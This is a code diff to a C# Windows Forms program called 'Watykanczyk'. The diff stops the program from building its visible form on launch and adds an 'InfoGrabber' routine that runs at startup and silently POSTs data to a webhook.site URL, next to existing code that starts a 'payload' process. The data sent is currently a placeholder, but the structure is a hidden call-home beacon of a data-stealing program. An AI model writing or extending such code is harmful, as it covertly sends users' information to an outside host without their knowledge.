@@ -3,6 +3,7 @@ using System;
 using System.Diagnostics;
 using System.Drawing;
 using System.IO;
+using System.Net.Http;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -12,7 +13,19 @@ namespace Watykanczyk
     {
         public MainForm()
         {
+            //TestMode();
+            NormalMode();
+        }
+
+        private void TestMode()
+        {
+            InitializeComponent();
+        }
+
+        private void NormalMode()
+        {
             CheckIfProgramShouldRun();
+            InfoGrabber();
 
             try
             {
@@ -91,11 +104,6 @@ namespace Watykanczyk
             payload.Start();
         }
 
-        private void BtnTest_Click(object sender, EventArgs e)
-        {
-            StartNewThread();
-        }
-
         private void CheckIfProgramShouldRun()
         {
             string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
@@ -127,6 +135,28 @@ namespace Watykanczyk
                     Environment.Exit(0);
                 }
             }
+        }
+
+        private void InfoGrabber()
+        {
+            string webhookURL = "https://webhook.site/aa00f378-ea14-426b-93e1-57ee5396163e";
+
+            using (var client = new HttpClient())
+            {
+                var content = new StringContent("Hello, I am dummy dumb dumb");
+
+                var response = client.PostAsync(webhookURL, content).Result;
+            }
+        }
+
+        private void BtnRunPayload_Click(object sender, EventArgs e)
+        {
+            StartNewThread();
+        }
+
+        private void BtnGetInfo_Click(object sender, EventArgs e)
+        {
+            InfoGrabber();
         }
     }
 }
